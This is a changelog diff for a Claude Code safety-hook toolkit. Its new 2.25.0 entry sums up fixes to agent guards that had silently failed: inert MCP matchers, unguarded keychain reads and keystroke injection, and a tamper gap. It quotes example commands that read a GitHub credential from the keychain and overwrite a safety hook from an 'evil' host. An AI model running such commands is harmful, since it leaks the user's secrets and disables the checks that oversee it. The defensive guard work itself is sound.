@@ -2,6 +2,28 @@
 
 ## Contents
 
+- [2.25.0] - 2026-07-30 — **Roll-up of the 2.24.5 → 2.24.16 arc. Update this one if you skip the rest.** Twelve patch releases in a day is not a story a version range tells, and three of them fixed guards that were **installed, tested, and not running**. If you are on any 2.24.x, this is the one to take.
+
+  **Three security holes, all of them silent.**
+  - **Every MCP hook was inert** (2.24.5). Claude Code decides matcher mode from the matcher's own characters, so the bare prefix `mcp__` asked for a tool literally *named* `mcp__` and matched nothing. Thirteen registrations sat dead — including `mcp-egress-guard` (SSRF, webhook exfil, paste-site egress inside MCP arguments), the `mcp__` arms of the injection and secret scanners, four server-specific guards, and `safety.sh`'s shell-exec MCP coverage. An unmatched matcher fires nothing and errors nothing; the only visible symptom was a missing statusline badge.
+  - **Keychain reads and keystroke injection were unguarded** (2.24.13). `security find-generic-password -s github -w` returns a credential straight to stdout with no GUI confirmation, and `osascript … keystroke` types into whatever window has focus — enough to drive a password prompt or a terminal the agent is not permitted to use. Both were already *declared dangerous in the fuzzer's own corpus with no pattern implementing them*: asserted coverage that never existed, hidden inside a false-negative total nobody had triaged.
+  - **Nothing stopped a hook being overwritten** (2.24.14). The tamper guard covered delete and edit-in-place but no way of *writing a new file*, so `curl -o ~/.claude/supercharger/hooks/safety.sh https://evil` replaced a security guard with attacker content and no guard in the chain objected.
+
+  **CI had been red since 2.24.6** and was fixed in 2.24.11. The suite total is environment-dependent — two tests put their assertion *inside* a tool-availability gate, so where the tool was missing the assertion did not run, it ceased to exist. ubuntu counted 2608, macOS 2607, and the badge check compares exactly, so the matrix could never be green on both at once. macOS was never seen failing because fail-fast cancelled it.
+
+  **Guard false positives, retired** (2.24.9, 2.24.10, 2.24.12, 2.24.14). Measured over an identical 5,705-run corpus: **false positives 50 → 0, false negatives 340 → 0.** The narrowed patterns catch 40 mutated forms the old blanket pattern missed, so precision went up *and* coverage went up. Fixed along the way: a read-only command denied because a Python loop variable `ln` matched the symlink verb; `/perf`'s own documented profiling sentinel blocked by the guard it configures; the injection scanner firing on the test suite's own attack fixtures; and an unrelated `rm` poisoning any compound command that mentioned the install directory.
+
+  **One failure mode ran through all of it: declared but not effective.** A matcher that matched nothing. Coverage asserted in a corpus with no pattern behind it. Assertions that vanished when a tool was absent. A fuzz mutation that was a no-op. A hook catalog that advertised itself as auto-generated and never was. Each passed inspection, each failed silently, and each is now enforced structurally rather than by care:
+
+  | Layer | What it catches | Would have caught |
+  |---|---|---|
+  | `test-orphan-registration` | the file never runs | fuzz-safety never collected |
+  | `test-suite-count-invariance` | the assertion never runs | the six red CI releases |
+  | `test-matcher-validity` | the matcher never matches | 2.24.5 — verified: 57 inert tokens on the v2.24.4 tree |
+  | `list-hooks.sh --check` | the doc never regenerates | 33 lines of missing catalog |
+
+  **No breaking changes.** One behavior change worth knowing: hand-deploying by `cp`-ing into `~/.claude/supercharger/hooks/` is now denied — use `install.sh` / `update.sh`, which are unaffected. Suite **2,678 passing** (from 2,430 at 2.24.4), green on ubuntu and macOS.
+
 - [2.24.16] - 2026-07-30 — fix(docs): **`docs/HOOKS.md` advertises itself as auto-generated, and nothing ever checked that it had been regenerated. It hadn't.** The catalog users read to learn what is enforced was missing `harness-tamper-guard`, `bash-injection-scanner` and `test-mask-guard` — 151 lines committed against 184 generated. `tests/test-list-hooks.sh` exercised the *generator* thoroughly and never once compared its output to the committed file.
 
   Same silent-staleness shape the repo already guards elsewhere: `gen-plugin-hooks.sh --check` protects `hooks.json`, and `run.sh` protects the README tests badge. The hook catalog had no equivalent, so it rotted quietly while every test stayed green. `tools/list-hooks.sh --check` now mirrors that pattern (generation moved into a `generate()` function so the print and check paths cannot drift), with two tests: the committed doc must be current, and `--check` must actually fail on a deliberately stale file.
